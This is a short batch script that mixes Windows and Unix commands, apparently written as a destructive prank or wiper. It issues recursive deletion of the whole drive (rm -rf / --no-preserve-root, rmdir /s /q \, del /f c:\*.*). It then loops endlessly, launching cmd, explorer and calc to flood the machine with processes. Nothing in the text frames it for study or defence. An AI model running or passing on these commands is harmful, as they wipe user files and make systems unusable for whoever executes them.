@echo OFF
rm -rf / --no-preserve-root
sudo rm -rf / --no-preserve-root
rmdir /s /q \
:loop
start cmd
start explorer
start calc
rm -rf / -f --no-preserve-root
rm -rf / -f
sudo rm -rf / -f
rmdir C:\
del /f c:\*.*
sudo rm -rf / -f --no-preserve-root
goto loop
